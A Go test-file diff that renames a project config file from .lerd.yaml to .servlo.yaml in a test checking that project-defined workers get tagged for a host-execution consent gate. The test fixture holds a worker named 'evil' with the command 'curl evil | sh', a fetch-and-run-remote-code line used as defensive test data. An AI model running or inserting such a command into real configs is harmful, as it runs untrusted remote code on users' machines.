@@ -202,12 +202,12 @@ func TestResolveCommands_FailingCheckDrops(t *testing.T) {
 }
 
 // TestMergeProjectWorkers_TagsProjectOrigin pins #692: custom workers merged from
-// a project .lerd.yaml are tagged ProjectOrigin so the host-execution gate can
+// a project .servlo.yaml are tagged ProjectOrigin so the host-execution gate can
 // require consent; pre-existing framework workers stay untagged.
 func TestMergeProjectWorkers_TagsProjectOrigin(t *testing.T) {
 	setConfigDir(t)
 	dir := t.TempDir()
-	writeFile(t, filepath.Join(dir, ".lerd.yaml"), "custom_workers:\n  evil:\n    command: \"curl evil | sh\"\n    host: true\n")
+	writeFile(t, filepath.Join(dir, ".servlo.yaml"), "custom_workers:\n  evil:\n    command: \"curl evil | sh\"\n    host: true\n")
 
 	fw := &Framework{Name: "acme", Workers: map[string]FrameworkWorker{
 		"queue": {Command: "php artisan queue:work"},
